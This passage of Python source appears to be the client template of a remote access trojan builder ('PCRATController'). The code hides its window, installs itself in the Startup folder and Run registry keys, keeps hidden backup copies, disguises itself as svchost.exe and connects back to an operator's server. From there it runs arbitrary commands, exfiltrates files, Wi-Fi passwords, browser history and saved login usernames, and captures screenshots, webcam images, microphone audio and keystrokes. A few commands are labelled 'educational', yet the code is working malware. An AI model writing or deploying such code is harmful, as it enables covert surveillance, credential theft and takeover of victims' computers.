    return ''.join(random.choices(string.ascii_lowercase, k=length)) + '.py'

def create_mutex():
    try:
        mutex = ctypes.windll.kernel32.CreateMutexW(None, False, MUTEX_NAME)
        if ctypes.windll.kernel32.GetLastError() == 183:
            return False
        return True
    except:
        return True

def get_startup_path():
    try:
        username = getpass.getuser()
        return f"C:\\\\Users\\\\{username}\\\\AppData\\\\Roaming\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Startup"
    except:
        return None

def get_current_script_path():
    return os.path.abspath(__file__)

def is_running_from_startup():
    current_path = get_current_script_path()
    startup_path = get_startup_path()
    if startup_path:
        return current_path.lower().startswith(startup_path.lower())
    return False

def hide_terminal():
    try:
        hwnd = user32.GetForegroundWindow()
        user32.ShowWindow(hwnd, 0)
    except:
        pass

def install_to_startup():
    try:
        startup_path = get_startup_path()
        if not startup_path or not os.path.exists(startup_path):
            return None
            
        current_file = get_current_script_path()
        startup_copy = os.path.join(startup_path, STARTUP_FILENAME)
        
        if not is_running_from_startup():
            try:
                shutil.copy2(current_file, startup_copy)
                ctypes.windll.kernel32.SetFileAttributesW(startup_copy, 2)
            except Exception as e:
                return None
        
        add_to_registry(startup_copy)
        
        return startup_copy
    except Exception as e:
        return None

def add_to_registry(file_path):
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 
                           "Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run", 
                           0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, REGISTRY_KEY_NAME, 0, winreg.REG_SZ, 
                         f'pythonw "{file_path}"')
        winreg.CloseKey(key)
        
        try:
            key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, 
                               "Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run", 
                               0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(key, REGISTRY_KEY_NAME, 0, winreg.REG_SZ, 
                             f'pythonw "{file_path}"')
            winreg.CloseKey(key)
        except:
            pass
            
    except Exception as e:
        pass

def remove_from_registry():
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 
                           "Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run", 
                           0, winreg.KEY_SET_VALUE)
        winreg.DeleteValue(key, REGISTRY_KEY_NAME)
        winreg.CloseKey(key)
        
        try:
            key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, 
                               "Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run", 
                               0, winreg.KEY_SET_VALUE)
            winreg.DeleteValue(key, REGISTRY_KEY_NAME)
            winreg.CloseKey(key)
        except:
            pass
    except:
        pass

def obfuscate_string(s):
    return base64.b64encode(s.encode()).decode()

def create_backup_copies():
    backup_locations = [
        os.path.join(os.environ.get('TEMP', ''), random_name()),
        os.path.join(os.environ.get('APPDATA', ''), 'Microsoft', 'Windows', random_name()),
        os.path.join(os.environ.get('LOCALAPPDATA', ''), 'Microsoft', 'Windows', random_name())
    ]
    
    current_file = get_current_script_path()
    created_backups = []
    
    for backup_path in backup_locations:
        try:
            os.makedirs(os.path.dirname(backup_path), exist_ok=True)
            shutil.copy2(current_file, backup_path)
            ctypes.windll.kernel32.SetFileAttributesW(backup_path, 2)
            created_backups.append(backup_path)
        except:
            continue
    
    return created_backups

def monitor_and_restart():
    current_pid = os.getpid()
    startup_path = get_startup_path()
    startup_file = os.path.join(startup_path, STARTUP_FILENAME) if startup_path else None
    
    while True:
        try:
            time.sleep(PROCESS_MONITOR_INTERVAL)
            
            if PSUTIL_AVAILABLE:
                if not psutil.pid_exists(current_pid):
                    break
            else:
                try:
                    os.kill(current_pid, 0)
                except OSError:
                    break
                
            if startup_file and not os.path.exists(startup_file):
                install_to_startup()
                
        except Exception as e:
            time.sleep(RESTART_DELAY)
            continue
    
    restart_process()

def restart_process():
    try:
        startup_path = get_startup_path()
        if startup_path:
            startup_file = os.path.join(startup_path, STARTUP_FILENAME)
            if os.path.exists(startup_file):
                subprocess.Popen([sys.executable, startup_file], 
                               creationflags=subprocess.CREATE_NO_WINDOW)
                return
        
        subprocess.Popen([sys.executable, get_current_script_path()], 
                       creationflags=subprocess.CREATE_NO_WINDOW)
    except Exception as e:
        pass

def setup_persistence():
    try:
        startup_copy = install_to_startup()
        
        create_backup_copies()
        
        if startup_copy and not is_running_from_startup():
            try:
                subprocess.Popen([sys.executable, startup_copy], 
                               creationflags=subprocess.CREATE_NO_WINDOW)
                time.sleep(2)
                sys.exit(0)
            except:
                pass
        
        monitor_thread = threading.Thread(target=monitor_and_restart, daemon=True)
        monitor_thread.start()
        
        return True
    except Exception as e:
        return False

def robust_connect(server_ip, server_port, max_attempts=MAX_RECONNECT_ATTEMPTS):
    attempt = 0
    while attempt < max_attempts:
        try:
            client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client.settimeout(30)
            
            print(f"Connection attempt {attempt + 1} to {server_ip}:{server_port}")
            client.connect((server_ip, server_port))
            client.settimeout(None)
            print(f"Successfully connected to {server_ip}:{server_port}")
            return client
            
        except Exception as e:
            print(f"Connection failed: {e}. Retrying in {RECONNECT_DELAY} seconds...")
            attempt += 1
            time.sleep(RECONNECT_DELAY)
            
            if attempt % 10 == 0:
                try:
                    setup_persistence()
                except:
                    pass
    
    print("Max connection attempts reached. Restarting client...")
    time.sleep(30)
    start_client(server_ip, server_port)

def handle_command(client, command):
    try:
        if not command:
            return True

        if command.lower() == "exit":
            return False

        if command.lower() == "getip":
            r = requests.get('https://api64.ipify.org?format=json')
            response = r.json()
            output = response['ip']
            client.send(output.encode())
            
        elif command.lower() == "sysinfo":
            info = f"System Information:\\n- OS: {platform.system()} {platform.release()}\\n- Version: {platform.version()}\\n- Machine: {platform.machine()}\\n- Processor: {platform.processor()}\\n- Username: {os.getlogin()}\\n- Current Directory: {os.getcwd()}\\n- Hostname: {platform.node()}\\n- Python: {platform.python_version()}"
            client.send(info.encode())
            
        elif command.lower() == "pwd":
            output = os.getcwd()
            client.send(output.encode())
            
        elif command.lower() == "tasklist":
            try:
                output = subprocess.check_output("tasklist", shell=True, text=True)
            except Exception as e:
                output = str(e)
            client.send(output.encode())
            
        elif command.lower().startswith("kill "):
            process_name = command[5:]
            try:
                result = subprocess.run(f"taskkill /f /im {process_name}", shell=True, capture_output=True, text=True)
                output = result.stdout if result.returncode == 0 else f"Failed: {result.stderr}"
            except Exception as e:
                output = f"Error: {e}"
            client.send(output.encode())
            
        elif command.lower().startswith("cd "):
            new_dir = command[3:]
            try:
                os.chdir(new_dir)
                output = f"Changed to: {os.getcwd()}"
            except Exception as e:
                output = f"Error: {e}"
            client.send(output.encode())
            
        elif command.lower() == "dir" or command.lower() == "ls":
            try:
                files = os.listdir()
                output = "\\n".join(files)
            except Exception as e:
                output = f"Error: {e}"
            client.send(output.encode())
            
        elif command.lower().startswith("download "):
            filename = command[9:]
            try:
                if os.path.exists(filename) and os.path.isfile(filename):
                    if os.access(filename, os.R_OK):
                        with open(filename, 'rb') as f:
                            file_data = f.read()
                        client.send(b"FILE_START:" + file_data + b":FILE_END")
                    else:
                        client.send(b"Permission denied: Cannot read file")
                else:
                    client.send(b"File not found")
            except Exception as e:
                client.send(f"Error: {e}".encode())
                
        elif command.lower().startswith("del "):
            filename = command[4:]
            try:
                if os.path.exists(filename):
                    if os.access(filename, os.W_OK):
                        os.remove(filename)
                        output = f"Deleted: {filename}"
                    else:
                        output = "Permission denied: Cannot delete file"
                else:
                    output = "File not found"
            except Exception as e:
                output = f"Error: {e}"
            client.send(output.encode())
            
        elif command.lower() == "screenshot":
            try:
                from PIL import ImageGrab
                import io
                
                screenshot = ImageGrab.grab()
                img_buffer = io.BytesIO()
                screenshot.save(img_buffer, format='PNG')
                img_data = img_buffer.getvalue()
                img_buffer.close()
                
                size_header = f"SCREENSHOT_SIZE:{len(img_data)}".encode()
                client.send(size_header)
                time.sleep(0.1)
                
                client.send(img_data)
                
            except ImportError:
                client.send(b"PIL not installed. Install with: pip install pillow")
            except Exception as e:
                client.send(f"Screenshot Error: {e}".encode())
                
        elif command.lower() == "processes":
            try:
                output = subprocess.check_output("wmic process get name,processid", shell=True, text=True)
            except Exception as e:
                output = str(e)
            client.send(output.encode())
            
        elif command.lower() == "netstat":
            try:
                output = subprocess.check_output("netstat -an", shell=True, text=True)
            except Exception as e:
                output = str(e)
            client.send(output.encode())
            
        elif command.lower() == "systeminfo":
            try:
                output = subprocess.check_output("systeminfo", shell=True, text=True, errors='ignore')
            except Exception as e:
                output = f"Limited info: {e}\\nTry individual commands instead."
            client.send(output.encode())
            
        elif command.lower().startswith("find "):
            filename = command[5:]
            try:
                output = subprocess.check_output(f'dir /s /b "*{filename}*"', shell=True, text=True, errors='ignore')
            except Exception as e:
                output = str(e)
            client.send(output.encode())

        elif command.lower() == "wifipasswords":
            try:
                output = subprocess.check_output('netsh wlan show profiles', shell=True, text=True, errors='ignore')
                profiles = [line.split(":")[1].strip() for line in output.split('\\n') if "All User Profile" in line]
                
                wifi_passwords = "WiFi Passwords:\\n"
                for profile in profiles:
                    try:
                        result = subprocess.check_output(f'netsh wlan show profile "{profile}" key=clear', shell=True, text=True, errors='ignore')
                        for line in result.split('\\n'):
                            if "Key Content" in line:
                                password = line.split(":")[1].strip()
                                wifi_passwords += f"{profile}: {password}\\n"
                    except:
                        wifi_passwords += f"{profile}: <could not retrieve>\\n"
                
                client.send(wifi_passwords.encode())
            except Exception as e:
                client.send(f"Error getting WiFi passwords: {e}".encode())

        elif command.lower() == "browserhistory":
            try:
                history_info = "Browser History:\\n"
                browsers = [
                    ("Chrome", os.path.expanduser("~\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\History")),
                    ("Edge", os.path.expanduser("~\\\\AppData\\\\Local\\\\Microsoft\\\\Edge\\\\User Data\\\\Default\\\\History"))
                ]
                
                for browser_name, browser_db in browsers:
                    if os.path.exists(browser_db):
                        try:
                            temp_db = os.path.join(tempfile.gettempdir(), f"temp_{browser_name}_history")
                            shutil.copy2(browser_db, temp_db)
                            
                            conn = sqlite3.connect(temp_db)
                            cursor = conn.cursor()
                            
                            cursor.execute("SELECT url, title, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 20")
                            results = cursor.fetchall()
                            
                            history_info += f"\\n--- {browser_name} History (Last 20 sites) ---\\n"
                            for url, title, visit_time in results:
                                if visit_time:
                                    try:
                                        dt = datetime(1601, 1, 1) + timedelta(microseconds=visit_time)
                                        date_str = dt.strftime("%Y-%m-%d %H:%M:%S")
                                    except:
                                        date_str = "Unknown time"
                                else:
                                    date_str = "Unknown time"
                                
                                history_info += f"URL: {url}\\nTitle: {title}\\nLast Visit: {date_str}\\n{'-'*50}\\n"
                            
                            conn.close()
                            os.remove(temp_db)
                            
                        except Exception as e:
                            history_info += f"\\n--- {browser_name} Error: {e} ---\\n"
                    else:
                        history_info += f"\\n--- {browser_name} not found ---\\n"
                
                client.send(history_info.encode())
            except Exception as e:
                client.send(f"Error accessing browser history: {e}".encode())

        elif command.lower() == "webcam":
            try:
                import cv2
                cam = cv2.VideoCapture(0)
                ret, frame = cam.read()
                if ret:
                    _, img_encoded = cv2.imencode('.png', frame)
                    img_data = img_encoded.tobytes()
                    
                    size_header = f"WEBCAM_SIZE:{len(img_data)}".encode()
                    client.send(size_header)
                    time.sleep(0.1)
                    client.send(img_data)
                else:
                    client.send(b"Could not access webcam")
                cam.release()
            except ImportError:
                client.send(b"OpenCV not installed. Install with: pip install opencv-python")
            except Exception as e:
                client.send(f"Webcam Error: {e}".encode())

        elif command.lower() == "keylogger_start":
            try:
                from pynput import keyboard
                import threading
                
                log_file = os.path.join(tempfile.gettempdir(), "keylog.txt")
                keys = []
                
                def on_press(key):
                    try:
                        keys.append(str(key).replace("'", ""))
                        if len(keys) > 50:
                            with open(log_file, "a", encoding="utf-8") as f:
                                f.write("".join(keys) + "\\n")
                            keys.clear()
                    except:
                        pass
                
                listener = keyboard.Listener(on_press=on_press)
                listener.start()
                client.send(b"Keylogger started - checking temp folder for keylog.txt")
            except ImportError:
                client.send(b"pynput not installed. Install with: pip install pynput")
            except Exception as e:
                client.send(f"Keylogger Error: {e}".encode())

        elif command.lower() == "mic_record":
            try:
                import pyaudio
                import wave
                
                CHUNK = 1024
                FORMAT = pyaudio.paInt16
                CHANNELS = 1
                RATE = 4410
                RECORD_SECONDS = 10
                
                audio = pyaudio.PyAudio()
                stream = audio.open(format=FORMAT, channels=CHANNELS,
                                  rate=RATE, input=True,
                                  frames_per_buffer=CHUNK)
                
                frames = []
                for i in range(0, int(RATE / CHUNK * RECORD_SECONDS)):
                    data = stream.read(CHUNK)
                    frames.append(data)
                
                stream.stop_stream()
                stream.close()
                audio.terminate()
                
                temp_wav = os.path.join(tempfile.gettempdir(), "recorded_audio.wav")
                wf = wave.open(temp_wav, 'wb')
                wf.setnchannels(CHANNELS)
                wf.setsampwidth(audio.get_sample_size(FORMAT))
                wf.setframerate(RATE)
                wf.writeframes(b''.join(frames))
                wf.close()
                
                with open(temp_wav, 'rb') as f:
                    audio_data = f.read()
                
                os.remove(temp_wav)
                client.send(b"AUDIO_START:" + audio_data + b":AUDIO_END")
                
            except ImportError:
                client.send(b"PyAudio not installed. Install with: pip install pyaudio")
            except Exception as e:
                client.send(f"Microphone Error: {e}".encode())

        elif command.lower() == "clipboard":
            try:
                import win32clipboard
                win32clipboard.OpenClipboard()
                data = win32clipboard.GetClipboardData()
                win32clipboard.CloseClipboard()
                client.send(f"Clipboard: {data}".encode())
            except ImportError:
                client.send(b"pywin32 not installed. Install with: pip install pywin32")
            except Exception as e:
                client.send(f"Clipboard Error: {e}".encode())

        elif command.lower() == "startup":
            try:
                startup_path = os.path.expanduser("~\\\\AppData\\\\Roaming\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Startup")
                if os.path.exists(startup_path):
                    files = os.listdir(startup_path)
                    output = f"Startup files:\\n" + "\\n".join(files)
                else:
                    output = "Startup folder not found"
                client.send(output.encode())
            except Exception as e:
                client.send(f"Startup Error: {e}".encode())

        elif command.lower().startswith("message "):
            try:
                message_text = command[8:]
                ctypes.windll.user32.MessageBoxW(0, message_text, "System Message", 0x1000)
                client.send(b"Message displayed")
            except Exception as e:
                client.send(f"Message Error: {e}".encode())

        elif command.lower().startswith("beep "):
            try:
                import winsound
                duration = int(command[5:])
                winsound.Beep(1000, duration)
                client.send(b"Beep played")
            except:
                client.send(b"Beep failed")

        elif command.lower() == "disable_taskmgr":
            try:
                subprocess.run('reg add "HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Policies\\\\System" /v DisableTaskMgr /t REG_DWORD /d 1 /f', shell=True)
                client.send(b"Task Manager disabled")
            except Exception as e:
                client.send(f"Error: {e}".encode())

        elif command.lower() == "enable_taskmgr":
            try:
                subprocess.run('reg add "HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Policies\\\\System" /v DisableTaskMgr /t REG_DWORD /d 0 /f', shell=True)
                client.send(b"Task Manager enabled")
            except Exception as e:
                client.send(f"Error: {e}".encode())

        elif command.lower() == "shutdown":
            try:
                subprocess.run("shutdown /s /t 30", shell=True)
                client.send(b"System will shutdown in 30 seconds")
            except Exception as e:
                client.send(f"Error: {e}".encode())

        elif command.lower() == "restart":
            try:
                subprocess.run("shutdown /r /t 30", shell=True)
                client.send(b"System will restart in 30 seconds")
            except Exception as e:
                client.send(f"Error: {e}".encode())

        elif command.lower() == "cancel_shutdown":
            try:
                subprocess.run("shutdown /a", shell=True)
                client.send(b"Shutdown cancelled")
            except Exception as e:
                client.send(f"Error: {e}".encode())

        elif command.lower() == "all":
            try:
                profiles_info = "Browser Profiles & Accounts:\\n"
                browsers = [
                    ("Chrome", os.path.expanduser("~\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data")),
                    ("Edge", os.path.expanduser("~\\\\AppData\\\\Local\\\\Microsoft\\\\Edge\\\\User Data")),
                    ("Opera GX", os.path.expanduser("~\\\\AppData\\\\Roaming\\\\Opera Software\\\\Opera GX Stable")),
                    ("Firefox", os.path.expanduser("~\\\\AppData\\\\Roaming\\\\Mozilla\\\\Firefox\\\\Profiles"))
                ]
                
                for browser_name, browser_path in browsers:
                    if os.path.exists(browser_path):
                        profiles_info += f"\\n--- {browser_name} ---\\n"
                        
                        if browser_name in ["Chrome", "Edge"]:
                            try:
                                profiles = []
                                for item in os.listdir(browser_path):
                                    full_path = os.path.join(browser_path, item)
                                    if os.path.isdir(full_path) and (item.startswith("Profile") or item == "Default" or item == "Guest Profile"):
                                        profiles.append(item)
                                
                                for profile in profiles:
                                    profile_path = os.path.join(browser_path, profile)
                                    login_data_file = os.path.join(profile_path, "Login Data")
                                    
                                    if os.path.exists(login_data_file):
                                        try:
                                            temp_db = os.path.join(tempfile.gettempdir(), f"temp_{browser_name}_{profile}_logins")
                                            shutil.copy2(login_data_file, temp_db)
                                            
                                            conn = sqlite3.connect(temp_db)
                                            cursor = conn.cursor()
                                            
                                            cursor.execute("SELECT origin_url, username_value, password_value FROM logins WHERE username_value != ''")
                                            logins = cursor.fetchall()
                                            
                                            if logins:
                                                profiles_info += f"Profile: {profile}\\n"
                                                for url, username, _ in logins:
                                                    domain = url.split('/')[2] if '/' in url else url
                                                    profiles_info += f"  {domain}: {username}\\n"
                                            else:
                                                profiles_info += f"Profile: {profile} - No saved logins found\\n"
                                            
                                            conn.close()
                                            os.remove(temp_db)
                                            
                                        except Exception as e:
                                            prefs_file = os.path.join(profile_path, "Preferences")
                                            if os.path.exists(prefs_file):
                                                try:
                                                    with open(prefs_file, 'r', encoding='utf-8', errors='ignore') as f:
                                                        prefs = json.load(f)
                                                    
                                                    account_info = ""
                                                    if 'account_info' in prefs:
                                                        for acc in prefs['account_info']:
                                                            if 'email' in acc:
                                                                account_info += f"  Email: {acc['email']}\\n"
                                                    
                                                    if account_info:
                                                        profiles_info += f"Profile: {profile}\\n{account_info}"
                                                    else:
                                                        profiles_info += f"Profile: {profile} - No accounts found\\n"
                                                    
                                                except:
                                                    profiles_info += f"Profile: {profile} - Error reading data\\n"
                                
                            except Exception as e:
                                profiles_info += f"Error reading {browser_name}: {e}\\n"
                        
                        elif browser_name == "Firefox":
                            try:
                                for profile_folder in os.listdir(browser_path):
                                    if os.path.isdir(os.path.join(browser_path, profile_folder)):
                                        profile_info = f"Profile: {profile_folder}\\n"
                                        
                                        key4_db = os.path.join(browser_path, profile_folder, "key4.db")
                                        logins_json = os.path.join(browser_path, profile_folder, "logins.json")
                                        
                                        if os.path.exists(logins_json):
                                            try:
                                                with open(logins_json, 'r', encoding='utf-8') as f:
                                                    logins_data = json.load(f)
                                                
                                                if 'logins' in logins_data:
                                                    found_logins = False
                                                    for login in logins_data['logins']:
                                                        if 'hostname' in login and 'encryptedUsername' in login:
                                                            domain = login['hostname']
                                                            profiles_info += f"  {domain}: [Encrypted username - requires master password]\\n"
                                                            found_logins = True
                                                    
                                                    if not found_logins:
                                                        profile_info += "  No readable logins found\\n"
                                                else:
                                                    profile_info += "  No saved logins\\n"
                                                    
                                            except Exception as e:
                                                profile_info += f"  Error reading logins: {e}\\n"
                                        else:
                                            profile_info += "  No login data found\\n"
                                        
                                        places_db = os.path.join(browser_path, profile_folder, "places.sqlite")
                                        if os.path.exists(places_db):
                                            try:
                                                temp_db = os.path.join(tempfile.gettempdir(), f"temp_firefox_{profile_folder}")
                                                shutil.copy2(places_db, temp_db)
                                                
                                                conn = sqlite3.connect(temp_db)
                                                cursor = conn.cursor()
                                                
                                                cursor.execute("SELECT url, title FROM moz_places WHERE (url LIKE '%login%' OR url LIKE '%account%' OR url LIKE '%signin%') AND (url LIKE '%roblox%' OR url LIKE '%discord%' OR url LIKE '%instagram%' OR url LIKE '%tiktok%' OR url LIKE '%youtube%' OR url LIKE '%google%' OR url LIKE '%facebook%' OR url LIKE '%twitter%' OR url LIKE '%github%') ORDER BY last_visit_date DESC LIMIT 10")
                                                results = cursor.fetchall()
                                                
                                                if results:
                                                    profile_info += "  Recent account-related visits:\\n"
                                                    for url, title in results:
                                                        domain = url.split('/')[2] if '/' in url else url
                                                        profile_info += f"    - {domain}\\n"
                                                
                                                conn.close()
                                                os.remove(temp_db)
                                            except Exception as e:
                                                pass
                                        
                                        profiles_info += profile_info
                                        
                            except Exception as e:
                                profiles_info += f"Error reading Firefox: {e}\\n"
                        
                        elif browser_name == "Opera GX":
                            try:
                                login_data_file = os.path.join(browser_path, "Default", "Login Data")
                                if os.path.exists(login_data_file):
                                    try:
                                        temp_db = os.path.join(tempfile.gettempdir(), "temp_opera_logins")
                                        shutil.copy2(login_data_file, temp_db)
                                        
                                        conn = sqlite3.connect(temp_db)
                                        cursor = conn.cursor()
                                        
                                        cursor.execute("SELECT origin_url, username_value FROM logins WHERE username_value != ''")
                                        logins = cursor.fetchall()
                                        
                                        if logins:
                                            profiles_info += "Saved logins:\\n"
                                            for url, username in logins:
                                                domain = url.split('/')[2] if '/' in url else url
                                                profiles_info += f"  {domain}: {username}\\n"
                                        else:
                                            profiles_info += "No saved logins found\\n"
                                        
                                        conn.close()
                                        os.remove(temp_db)
                                        
                                    except Exception as e:
                                        profiles_info += f"Error reading login data: {e}\\n"
                                else:
                                    profiles_info += "No login data found\\n"
                                    
                            except Exception as e:
                                profiles_info += f"Error reading Opera GX: {e}\\n"
                    
                    else:
                        profiles_info += f"\\n--- {browser_name} not installed ---\\n"
                
                profiles_info += "\\n--- Specific Website Accounts Detected ---\\n"
                
                website_patterns = {
                    'Roblox': ['roblox.com', 'www.roblox.com'],
                    'TikTok': ['tiktok.com', 'www.tiktok.com'],
                    'Instagram': ['instagram.com', 'www.instagram.com'],
                    'YouTube': ['youtube.com', 'www.youtube.com'],
                    'Gmail': ['gmail.com', 'mail.google.com'],
                    'Discord': ['discord.com', 'www.discord.com', 'discord.gg'],
                    'Facebook': ['facebook.com', 'www.facebook.com'],
                    'Twitter': ['twitter.com', 'www.twitter.com', 'x.com'],
                    'Reddit': ['reddit.com', 'www.reddit.com'],
                    'Netflix': ['netflix.com', 'www.netflix.com'],
                    'Amazon': ['amazon.com', 'www.amazon.com'],
                    'Spotify': ['spotify.com', 'www.spotify.com'],
                    'Twitch': ['twitch.tv', 'www.twitch.tv'],
                    'Steam': ['steamcommunity.com', 'store.steampowered.com'],
                    'Epic Games': ['epicgames.com', 'www.epicgames.com'],
                    'PayPal': ['paypal.com', 'www.paypal.com'],
                    'Microsoft': ['microsoft.com', 'login.live.com'],
                    'Yahoo': ['yahoo.com', 'mail.yahoo.com'],
                    'Outlook': ['outlook.com', 'live.com'],
                    'GitHub': ['github.com', 'www.github.com'],
                    'LinkedIn': ['linkedin.com', 'www.linkedin.com'],
                    'Pinterest': ['pinterest.com', 'www.pinterest.com'],
                    'Snapchat': ['snapchat.com', 'www.snapchat.com'],
                    'WhatsApp': ['web.whatsapp.com'],
                    'Telegram': ['web.telegram.org'],
                    'Zoom': ['zoom.us', 'www.zoom.us'],
                    'Shopify': ['shopify.com', 'www.shopify.com'],
                    'WordPress': ['wordpress.com', 'www.wordpress.com'],
                    'Ebay': ['ebay.com', 'www.ebay.com'],
                    'AliExpress': ['aliexpress.com', 'www.aliexpress.com']
                }
                
                browser_paths = [
                    ("Chrome", os.path.expanduser("~\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data")),
                    ("Edge", os.path.expanduser("~\\\\AppData\\\\Local\\\\Microsoft\\\\Edge\\\\User Data")),
                    ("Opera GX", os.path.expanduser("~\\\\AppData\\\\Roaming\\\\Opera Software\\\\Opera GX Stable"))
                ]
                
                for browser_name, browser_path in browser_paths:
                    if os.path.exists(browser_path):
                        try:
                            history_files = []
                            for item in os.listdir(browser_path):
                                item_path = os.path.join(browser_path, item)
                                if os.path.isdir(item_path):
                                    history_path = os.path.join(item_path, "History")
                                    if os.path.exists(history_path):
                                        history_files.append((browser_name, history_path, item))
                            
                            for bname, history_file, profile in history_files:
                                try:
                                    temp_db = os.path.join(tempfile.gettempdir(), f"temp_{bname}_{profile}_history")
                                    shutil.copy2(history_file, temp_db)
                                    
                                    conn = sqlite3.connect(temp_db)
                                    cursor = conn.cursor()
                                    
                                    for site_name, domains in website_patterns.items():
                                        domain_conditions = " OR ".join([f"url LIKE '%{domain}%'" for domain in domains])
                                        cursor.execute(f"SELECT url, title FROM urls WHERE {domain_conditions} ORDER BY last_visit_time DESC LIMIT 5")
                                        results = cursor.fetchall()
                                        
                                        if results:
                                            profiles_info += f"  {site_name}: Active in {bname} (Profile: {profile})\\n"
                                            for url, title in results[:2]: 
                                                profiles_info += f"    - {url}\\n"
                                    
                                    conn.close()
                                    os.remove(temp_db)
                                    
                                except Exception as e:
                                    continue
                                    
                        except Exception as e:
                            continue
                
                client.send(profiles_info.encode())
                
            except Exception as e:
                client.send(f"Error getting browser profiles: {e}".encode())

        elif command.lower() == "av_evasion_demo":
            try:
                evasion_info = "Educational AV Evasion Techniques:\\n"
                
                current_file = os.path.abspath(__file__)
                file_stats = os.stat(current_file)
                evasion_info += f"File Size: {file_stats.st_size} bytes\\n"
                evasion_info += f"File Location: {current_file}\\n"
                
                client.send(evasion_info.encode())
            except Exception as e:
                client.send(f"Evasion demo failed: {e}".encode())

        elif command.lower() == "behavior_evasion":
            try:
                time.sleep(random.uniform(0.1, 2.0))
                
                dummy_files = []
                for i in range(3):
                    dummy_name = os.path.join(tempfile.gettempdir(), f"dummy_{random_name(6)}.tmp")
                    with open(dummy_name, 'w') as f:
                        f.write("Legitimate system file")
                    dummy_files.append(dummy_name)
                
                time.sleep(1)
                
                for dummy_file in dummy_files:
                    try:
                        os.remove(dummy_file)
                    except:
                        pass
                
                client.send(b"Educational: Behavioral evasion techniques demonstrated")
            except Exception as e:
                client.send(f"Behavior evasion failed: {e}".encode())

        else:
            try:
                output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, text=True, errors='ignore')
            except subprocess.CalledProcessError as e:
                output = e.output
            except Exception as e:
                output = str(e)
            client.send(output.encode())
            
        return True
        
    except Exception as e:
        print(f"Error handling command: {e}")
        return True

def start_client(server_ip, server_port):
    if not create_mutex():
        print("Another instance is already running, exiting...")
        sys.exit(0)
    
    hide_terminal()
    
    try:
        setup_persistence()
    except Exception as e:
        print(f"Persistence setup failed: {e}")
        pass
    
    try:
        kernel32.SetConsoleTitleW("svchost.exe")
    except:
        pass
    
    print(f"Starting persistent client - connecting to {server_ip}:{server_port}")
    
    while True:
        try:
            client = robust_connect(server_ip, server_port)
            
            while True:
                try:
                    command = client.recv(1024).decode()
                    
                    if not command:
                        raise ConnectionResetError("Connection lost")
                    
                    if not handle_command(client, command):
                        break
                        
                except socket.timeout:
                    try:
                        client.send(b" ")
                    except:
                        break
                    continue
                except (ConnectionResetError, BrokenPipeError, socket.error) as e:
                    print(f"Connection error: {e}")
                    break
                except Exception as e:
                    print(f"Unexpected error: {e}")
                    break
            
            try:
                client.close()
            except:
                pass
                
            print("Connection lost. Reconnecting...")
            time.sleep(RECONNECT_DELAY)
            
        except Exception as e:
            print(f"Client error: {e}. Restarting connection loop...")
            time.sleep(RECONNECT_DELAY)

def test_connection(ip, port):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(5)
        result = sock.connect_ex((ip, port))
        sock.close()
        return result == 0
    except:
        return False

def find_server_ip():
    if test_connection("127.0.0.1", 5555):
        return "127.0.0.1"
    
    local_ips = ["192.168.1.100", "192.168.0.100", "10.0.0.100", "172.16.0.100"]
    for ip in local_ips:
        if test_connection(ip, 5555):
            return ip
    
    return "127.0.0.1"

def main():
    SERVER_IP = "{SERVER_IP}"
    SERVER_PORT = {SERVER_PORT}
    
    if not test_connection(SERVER_IP, SERVER_PORT):
        print(f"Cannot connect to {SERVER_IP}:{SERVER_PORT}, looking for server...")
        SERVER_IP = find_server_ip()
    
    print(f"Starting persistent client to {SERVER_IP}:{SERVER_PORT}")
    
    start_client(SERVER_IP, SERVER_PORT)

if __name__ == "__main__":
    main()
"""

def main():
    root = tk.Tk()
    app = PCRATController(root)
    root.mainloop()

if __name__ == "__main__":
    main()
